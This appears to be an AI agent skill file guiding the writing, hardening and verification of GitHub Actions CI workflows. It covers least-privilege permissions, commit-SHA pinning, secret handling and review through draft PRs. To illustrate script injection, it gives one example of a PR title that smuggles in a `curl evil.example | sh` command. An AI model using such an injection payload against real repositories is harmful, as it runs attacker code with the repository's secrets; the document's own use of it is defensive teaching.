---
name: github-actions
description: "Use when writing, changing or debugging CI workflows."
version: 1.0.0
author: richardkfm/vibes
license: MIT
metadata:
  hermes:
    tags: [GitHub, Actions, CI, Workflows]
    related_skills: [github-releases, github-docs, github-lookup, lean-output]
---

<!-- Generated from .claude/skills/github-actions/SKILL.md by scripts/sync_hermes_skills.py. Edit the source and re-run the script. -->
# GitHub Actions

A workflow file is shared infrastructure. It runs on every contributor's push,
holds the repository's token and secrets, and blocks every merge when it is
wrong. So: read the repo first, start small, harden what gets written, prove it
runs, and ship it through a pull request people can review.

## When to Use

Use when the user invokes /github-actions, asks to add or set up CI/CD, a pipeline, a workflow or automated checks, wants a failing or slow Actions run diagnosed, or whenever a task touches a file under .github/workflows, even if GitHub Actions is never named.

## Look before writing

```bash
ls .github/workflows/ .github/actions/ .github/dependabot.yml 2>/dev/null
gh api repos/{owner}/{repo} --jq .default_branch   # gh fills {owner}/{repo}
gh pr checks <recent-pr-number> --required         # what gates merging today
```

- **Existing workflows are the convention.** Match their naming, runner,
  pinning and caching. Add a job to an existing workflow before creating a file
  that repeats checkout and install.
- **Find the commands people really run** (`package.json` scripts, Makefile,
  tox/nox, CONTRIBUTING), run them locally, and have CI call those same entry
  points. A private test invocation in CI drifts from what people run.
- **Take tool versions from the repo's own files** (`.nvmrc`,
  `.python-version`, `go.mod`) through the setup action's `*-version-file`
  input. Quote a version written inline: unquoted `3.10` is the number 3.1.
- **Know what gates merging.** Required checks match on job name. A renamed
  job, or a required workflow skipped by a `paths:` or `branches:` filter,
  leaves every PR waiting on a check that never reports. With a merge queue,
  required workflows also need the `merge_group` trigger.

## Start with the smallest useful workflow

One job running checks that already pass locally, on pull requests and the
default branch. A matrix, coverage, deploys and bots come later, one PR each.

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@<40-char-commit-sha> # vX.Y.Z
        with:
          persist-credentials: false
      - uses: actions/setup-node@<40-char-commit-sha> # vX.Y.Z
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
```

- **Triggers**: `pull_request` plus `push` to the default branch only; a bare
  `on: push` runs twice for every PR branch. `workflow_dispatch` (manual) and
  `schedule` (cron, in UTC) work only once the file is on the default branch.
- **`permissions`**: naming one permission sets all others to none, so the
  top-level `contents: read` is the whole grant. A job that needs more
  (`contents: write` for a release, `pull-requests: write` to comment) gets its
  own block, which replaces the top-level one: repeat `contents: read`.
- **`persist-credentials: false`**: checkout otherwise leaves the token in the
  git config for every later step. Drop it only in a job that pushes.
- **`concurrency`**: cancels a PR's superseded runs and lets default-branch
  runs finish. Never cancel a deploy or release halfway.
- **`timeout-minutes`**: the default is 360, so one hung test burns six hours.
  Set two to three times the normal duration.
- **`cache:`** on the setup action handles dependency caching. **No matrix**
  until the project claims support for several versions or systems.

## Pin actions to a commit SHA

A tag can be repointed: whoever controls an action's repository, or breaks into
it, can move `v4` to new code that runs with the workflow's token and secrets.
A full commit SHA cannot move. Pin every action and reusable workflow from
another repository, `actions/*` included; one rule is easier to audit than two.

Version numbers from memory are stale. Look them up each time:

```bash
gh api repos/OWNER/REPO/releases/latest --jq .tag_name   # e.g. v1.2.3
git ls-remote https://github.com/OWNER/REPO 'refs/tags/v1.2.3' 'refs/tags/v1.2.3^{}'
```

If a second line ending in `^{}` is printed, the tag is annotated and that line
holds the commit: use it, not the tag object above it. Without `gh`, list tags
with `git ls-remote --sort=-v:refname --tags <url> 'v*' | head`. Resolve
against the action's own repository, never a fork.

Write `uses: OWNER/REPO@<sha> # v1.2.3`. With the version on the same line,
Dependabot updates SHA and comment together. A pin never updates itself and
gets no Dependabot security alerts, so `.github/dependabot.yml` needs a
`package-ecosystem: github-actions` entry; add one if it is missing.

Exception: a repo with `.github/workflows/actions.lock` uses GitHub's workflow
dependency lockfile. Keep `uses:` on version tags there, run `gh actions-lock`
after changing any, and never edit the lockfile by hand. Adopting a lockfile is
the owner's call: propose it, don't introduce it.

## Untrusted input and secrets

`${{ }}` expressions are pasted into a `run:` script as text before the shell
starts, so a pull request titled `"; curl evil.example | sh; "` becomes code.
Anything an outsider can type is untrusted: PR and issue titles and bodies,
comments, labels, branch names (`github.head_ref`), commit messages, author
names. Pass those to the script as data:

```yaml
# vulnerable: the title becomes part of the script
- run: echo "Checking ${{ github.event.pull_request.title }}"

# safe: the title arrives in a variable the shell never parses as code
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $TITLE"
```

Secrets go into the `env:` of the one step that uses them; set job-wide, every
step and action in the job can read them. Keep them out of the log (no `echo`,
`set -x` or `env` dump): masking matches the exact value only, so a base64 or
JSON-wrapped copy prints in clear. Prefer OIDC (`id-token: write`) to a stored
key. Name the secrets the workflow expects in the PR; only the owner can add
them.

Under `pull_request`, a PR from a fork gets a read-only token and no secrets.
That is the protection working, so skip the secret-dependent steps for forks.
`pull_request_target`, `workflow_run` and `issue_comment` do run with the base
repository's secrets and a write token, on events an outsider can cause. Never
run fork code where those are in reach, and read
`references/privileged-triggers.md` before using any of the three.

## Validate before pushing

A broken workflow fails only after the push, in front of everyone. Run
`actionlint` from the repo root: it checks syntax, expressions, action inputs
and, with `shellcheck` installed, the `run:` scripts. Install it with `go
install github.com/rhysd/actionlint/cmd/actionlint@latest`,
`brew install actionlint`, or the download script in its README.

Without it, at least prove the file parses (`yq . FILE`, or `python3 -c 'import
sys,yaml; yaml.safe_load(open(sys.argv[1]))' FILE`) and say in the PR that
actionlint was not run. PyYAML loads the `on:` key as boolean `True`; that is a
YAML 1.1 quirk, not a defect.

## Verify after pushing

The work is done when a run has passed, not when the file is committed.

```bash
git push -u origin <branch>
gh run list --branch <branch> --limit 5         # run id; appears after a few seconds
gh run watch <run-id> --exit-status --compact   # blocks; non-zero on failure
gh run view <run-id> --log-failed > /tmp/ci.log 2>&1
grep -n -i -m 20 'error\|fail' /tmp/ci.log      # grep the log, don't dump it
```

On failure, read the failing step's log, reproduce locally, fix the cause and
push again. Read `references/troubleshooting.md` when no run appears, the
failure does not reproduce locally, the push is rejected, or the run is slow.

Green has to mean the checks passed. Do not get there with `continue-on-error`,
`|| true`, `if: false`, a deleted or skipped test, loosened lint rules, or a
filter that keeps the failing job from running. If a check already fails on the
default branch, or is flaky (confirm with one
`gh run rerun <run-id> --failed`), say so and let the user decide.

## Ship it through a draft PR

A workflow changes how everyone on the repo works: new waits, new ways to fail,
new spend. Open a draft PR instead of pushing to the default branch; it is also
where a `pull_request` workflow first proves itself. Write the description with
`github-docs` so a reviewer learns, without reading YAML: what triggers the
workflow and what it now blocks; the permissions, secrets and actions it brings
in; what the owner must set up by hand (secrets, required checks,
environments); how to run the same checks locally; and a link to a passing run.

## Related skills

- `github-releases`: versioning, tagging and publishing. Its reference file has
  a tag-triggered release workflow to build on.
- `github-docs`: the PR description and README, scaled to blast radius.
- `github-lookup`: search for an existing action or starter workflow first.
- `lean-output`: CI logs are long. Send them to a file and grep them.
